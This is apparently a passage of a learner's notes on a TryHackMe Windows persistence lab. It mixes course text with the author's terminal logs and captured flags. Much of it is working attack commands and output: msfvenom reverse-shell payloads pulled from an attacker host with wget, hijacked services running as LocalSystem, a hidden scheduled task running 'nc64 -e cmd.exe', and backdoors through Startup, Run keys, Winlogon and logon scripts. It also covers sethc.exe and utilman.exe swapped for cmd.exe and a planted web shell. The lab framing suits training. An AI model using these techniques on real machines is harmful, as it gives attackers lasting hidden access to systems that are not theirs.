    The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:

```

AttackBox

user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe

        


```


To reconfigure "THMservice3" parameters, we can use the following command:

```

Command Prompt

C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"

        


```

You can then query the service's configuration again to check if all went as expected:

```

Command Prompt

C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

        


```

	Start a Metasploit listener on your attacker's machine and manually start the service to receive a reverse shell. From there, run C:\flags\flag8.exe to get a flag!

```
┌──(kali㉿kali)-[~/payloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4448 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ ls
index.raw  launcher.bat  liv0ff.ps1  live0fftheland.dll  payload.hta  rev-svc.exe  thm.hta
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.170.100 - - [11/Sep/2022 16:56:10] "GET /rev-svc.exe HTTP/1.1" 200 -
10.10.170.100 - - [11/Sep/2022 16:58:38] "GET /rev-svc.exe HTTP/1.1" 200 -


PS C:\Windows> wget http://10.11.81.220:1337/rev-svc.exe -o rev-svc.exe

C:\Users\Administrator>sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
[SC] CreateService SUCCESS

C:\Users\Administrator>sc.exe start THMservice2

SERVICE_NAME: THMservice2
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3312
        FLAGS              :

┌──(kali㉿kali)-[~/payloads]
└─$ nc -nvlp 4448                                          
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4448
Ncat: Listening on 0.0.0.0:4448
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:49919.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\flags
cd C:\flags

C:\flags>.\flag7.exe
.\flag7.exe
THM{SUSPICIOUS_SERVICES}

```


Insert flag7 here
*THM{SUSPICIOUS_SERVICES}*

```
┌──(kali㉿kali)-[~/payloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=5558 -f exe-service -o rev-svc2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc2.exe
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.170.100 - - [11/Sep/2022 17:08:15] "GET /rev-svc2.exe HTTP/1.1" 200 -

PS C:\Users\Administrator> cd C:\Windows
PS C:\Windows> wget http://10.11.81.220:1337/rev-svc2.exe -o rev-svc2.exe

C:\Users\Administrator>sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : NT AUTHORITY\Local Service

C:\Users\Administrator>sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
[SC] ChangeServiceConfig SUCCESS

C:\Users\Administrator>sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\Administrator>sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\Administrator>sc.exe start THMservice3

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3736
        FLAGS              :

──(kali㉿kali)-[~/payloads]
└─$ nc -nvlp 5558
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5558
Ncat: Listening on 0.0.0.0:5558
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:49984.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\flags
cd C:\flags

C:\flags>.\flag8.exe
.\flag8.exe
THM{IN_PLAIN_SIGHT}

```


Insert flag8 here
*THM{IN_PLAIN_SIGHT}*

### Abusing Scheduled Tasks 

We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:

Task Scheduler

The most common way to schedule tasks is using the built-in Windows task scheduler. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use schtasks to interact with the task scheduler. A complete reference for the command can be found on Microsoft's website.

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:

```

Command Prompt

C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.

        


```

Note: Be sure to use THM-TaskBackdoor as the name of your task, or you won't get the flag.

The previous command will create a "THM-TaskBackdoor" task and execute an nc64 reverse shell back to the attacker. The /sc and /mo options indicate that the task should be run every single minute. The /ru option indicates that the task will run with SYSTEM privileges.

To check if our task was successfully created, we can use the following command:

```

Command Prompt

C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready

        


```

Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

	The security descriptors of all scheduled tasks are stored in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use psexec (available in C:\tools) to open Regedit with SYSTEM privileges:

```

Command Prompt

C:\> c:\tools\pstools\PsExec64.exe -s -i regedit

        


```

We will then delete the security descriptor for our task:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png)

If we try to query our service again, the system will tell us there is no such task:

```

Command Prompt

C:\> schtasks /query /tn thm-taskbackdoors
ERROR: The system cannot find the file specified.

        


```

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:

```

AttackBox

user@AttackBox$ nc -lvp 4449

        


```

	Use the reverse shell obtained through the task scheduler and execute C:\flags\flag9.exe to retrieve a flag.

```
C:\Users\Administrator>schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.11.81.220 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.

C:\Users\Administrator>schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         9/11/2022 9:17:00 PM   Ready

C:\Users\Administrator>c:\tools\pstools\PsExec64.exe -s -i regedit

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

┌──(kali㉿kali)-[~/payloads]
└─$ nc -nvlp 4449
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4449
Ncat: Listening on 0.0.0.0:4449
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:50000.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\flags
cd C:\flags

C:\flags>.\flag9.exe
.\flag9.exe
THM{JUST_A_MATTER_OF_TIME}
```
![[Pasted image 20220911161947.png]]

Insert flag9 here
*THM{JUST_A_MATTER_OF_TIME}*

### Logon Triggered Persistence 

Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.

Startup folder

	Each user has a folder under C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

	If we want to force all users to run a payload while logging in, we can use the folder under C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp in the same way.

For this task, let's generate a reverse shell payload using msfvenom:

```

AttackBox

user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe

        


```

We will then copy our payload into the victim machine. You can spawn an http.server with Python3 and use wget on the victim machine to pull your file:

```

AttackBox

user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 

        


```

```

Powershell

PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe

        


```

	We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.

```

Command Prompt

C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

        


```

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f0ba7fd44646d55c5505737642bdd96e.png)

	And log back via RDP. You should immediately receive a connection back to your attacker's machine.
	THM flagUse your newly obtained shell to execute C:\flags\flag10.exe and get your flag!

Run / RunOnce

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time.

For this task, let's create a new reverse shell with msfvenom:

```

AttackBox

user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe

        


```

	After transferring it to the victim machine, let's move it to C:\Windows\:

```

Command Prompt

C:\> move revshell.exe C:\Windows

        


```

	Let's then create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run. The entry's name can be anything you like, and the value will be the command we want to execute.

Note: While in a real-world set-up you could use any name for your registry entry, for this task you are required to use MyBackdoor to receive the flag.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c99038cd6cc9e37512edabb1f873a4da.png)

	After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
	THM flagUsing your newly obtained shell, execute C:\flags\flag11.exe to get a flag!

Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

	Winlogon uses some registry keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ that could be interesting to gain persistence:

    Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
    shell points to the system's shell, which is usually explorer.exe.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f3c2215af6e3f2d19313498fca62a9d4.png)

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

Let's start by creating a shell:

```

AttackBox

user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe

        


```

	We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:

```

Command Prompt

C:\> move revshell.exe C:\Windows

        


```

	We then alter either shell or Userinit in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\. In this case we will use Userinit, but the procedure with shell is the same.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dc5fa3e75ff056f11e16c03373799f45.png)

	After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
	THM flagUsing your newly obtained shell, execute C:\flags\flag12.exe to get a flag!

Logon scripts

One of the things userinit.exe does while loading your user profile is to check for an environment variable called UserInitMprLogonScript. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

```

AttackBox

user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe

        


```

	We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:

```

Command Prompt

C:\> move revshell.exe C:\Windows

        


```

	To create an environment variable for a user, you can go to its HKCU\Environment in the registry. We will use the UserInitMprLogonScript entry to point to our payload so it gets loaded when the users logs in:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ce41ee1fc282b8dcacd757b23417b12.png)

Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.

	After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
	THM flagUsing your newly obtained shell, execute C:\flags\flag13.exe to get a flag!


```
──(kali㉿kali)-[~/payloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4450 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.170.100 - - [11/Sep/2022 17:24:00] "GET /revshell.exe HTTP/1.1" 200 -

PS C:\Users\Administrator> wget http://10.11.81.220:1337/revshell.exe -o revshell.exe
PS C:\Users\Administrator> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

┌──(kali㉿kali)-[~/IDS_IPS_evasion]
└─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%


┌──(kali㉿kali)-[~/payloads]
└─$ nc -nvlp 4450
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4450
Ncat: Listening on 0.0.0.0:4450
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:50007.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\flags
cd C:\flags

C:\flags>.\flag10.exe
.\flag10.exe
THM{NO_NO_AFTER_YOU}

```

Insert flag10 here
*THM{NO_NO_AFTER_YOU}*

```
┌──(kali㉿kali)-[~/payloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4451 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ ls
index.raw     liv0ff.ps1          payload.hta   rev-svc2.exe  thm.hta
launcher.bat  live0fftheland.dll  revshell.exe  rev-svc.exe
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.170.100 - - [11/Sep/2022 17:38:29] "GET /revshell.exe HTTP/1.1" 200 -

create a new exapndable string value

sign out

┌──(kali㉿kali)-[~/payloads]
└─$ nc -nvlp 4451
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4451
Ncat: Listening on 0.0.0.0:4451
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:50035.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\flags
cd C:\flags

C:\flags>.\flag11.exe            
.\flag11.exe
THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}

```

![[Pasted image 20220911164426.png]]

Insert flag11 here
*THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}*

![[Pasted image 20220911165257.png]]

```
┌──(kali㉿kali)-[~/payloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4452 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.170.100 - - [11/Sep/2022 17:50:13] "GET /revshell.exe HTTP/1.1" 200 -

PS C:\Users\Administrator> cd C:\Windows
PS C:\Windows> wget http://10.11.81.220:1337/revshell.exe -o revshell.exe

┌──(kali㉿kali)-[~/IDS_IPS_evasion]
└─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%


┌──(kali㉿kali)-[~/payloads]
└─$ nc -nvlp 4452
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4452
Ncat: Listening on 0.0.0.0:4452
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:50050.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\flags
cd C:\flags

C:\flags>.\flag12.exe
.\flag12.exe
THM{I_INSIST_GO_FIRST}


```

Insert flag12 here

*THM{I_INSIST_GO_FIRST}*

![[Pasted image 20220911165827.png]]

![[Pasted image 20220911171545.png]]
remove this cz won't get flag13
```
┌──(kali㉿kali)-[~/payloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4453 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
                                                                                           
┌──(kali㉿kali)-[~/payloads]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.170.100 - - [11/Sep/2022 17:56:38] "GET /revshell.exe HTTP/1.1" 200 -

PS C:\Users\Administrator> cd C:\Windows                                                                                PS C:\Windows> wget http://10.11.81.220:1337/revshell.exe -o revshell.exe   

┌──(kali㉿kali)-[~/IDS_IPS_evasion]
└─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%


┌──(kali㉿kali)-[~/payloads]
└─$ nc -nvlp 4453
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4453
Ncat: Listening on 0.0.0.0:4453
Ncat: Connection from 10.10.170.100.
Ncat: Connection from 10.10.170.100:50091.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\flags
cd C:\flags

C:\flags>.\flag13.exe
.\flag13.exe
THM{USER_TRIGGERED_PERSISTENCE_FTW}

```

Insert flag13 here
*THM{USER_TRIGGERED_PERSISTENCE_FTW}*

### Backdooring the Login Screen / RDP 

If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

We will look at two methods that rely on accessibility features to this end.

Sticky Keys

When pressing key combinations like CTRL + ALT + DEL, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release CTRL, press and release ALT and finally, press and release DEL to achieve the same effect as pressing the CTRL + ALT + DEL combination.

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png)

After pressing SHIFT 5 times, Windows will execute the binary in C:\Windows\System32\sethc.exe. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing sethc.exe with a copy of cmd.exe. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite sethc.exe, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of cmd.exe. We can do so with the following commands:

```

Command Prompt

C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.

        


```


After doing so, lock your session from the start menu:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png)

You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png)

	From your newly obtained terminal, execute C:\flags\flag14.exe to get your flag!

Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png)

	When we click the ease of access button on the login screen, it executes C:\Windows\System32\Utilman.exe with SYSTEM privileges. If we replace it with a copy of cmd.exe, we can bypass the login screen again.

To replace utilman.exe, we do a similar process to what we did with sethc.exe:


```

Command Prompt

C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.

        


```

To trigger our terminal, we will lock our screen from the start button:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png)
And finally, proceed to click on the "Ease of Access" button. Since we replaced utilman.exe with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png)

	From your newly obtained terminal, execute C:\flags\flag15.exe to get your flag!

```
C:\Users\Administrator>takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "WPERSISTENCE\Administrator".

C:\Users\Administrator>icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.

locked then shift 5 times


```
![[Pasted image 20220911172233.png]]

![[Pasted image 20220911172243.png]]


Insert flag14 here
*THM{BREAKING_THROUGH_LOGIN}*

```
C:\Users\Administrator>takeown /f c:\Windows\System32\utilman.exe                                                                                                                                                                               SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "WPERSISTENCE\Administrator".                                                                                                                                C:\Users\Administrator>icacls C:\Windows\System32\utilman.exe /grant Administrator:F                                    processed file: C:\Windows\System32\utilman.exe                                                                         Successfully processed 1 files; Failed processing 0 files                                                                                                                                                                                       C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe                                 Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes                                                                    1 file(s) copied.   

lock then ease access 


```

![[Pasted image 20220911172530.png]]

![[Pasted image 20220911172546.png]]

Insert flag15 here
*THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}*

### Persisting Through Existing Services 

If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!

Using Web Shells

The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is iis apppool\defaultapppool. Even if this is an unprivileged user, it has the special SeImpersonatePrivilege, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the Windows Privesc Room.

	Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided here, but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the C:\inetpub\wwwroot directory:

```

Command Prompt

C:\> move shell.aspx C:\inetpub\wwwroot\

        


```

We can then run commands from the web server by pointing to the following URL:

http://MACHINE_IP/shell.aspx

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d9845057ebf54a61401ca61c2c268fe8.png)

Use your web shell to execute C:\flags\flag16.exe to get your flag!

While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.

Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the HRDB database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the xp_cmdshell stored procedure. xp_cmdshell is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

To enable it, let's open Microsoft SQL Server Management Studio 18, available from the start menu. When asked for authentication, just use Windows Authentication (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the New Query button to open the query editor:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png)

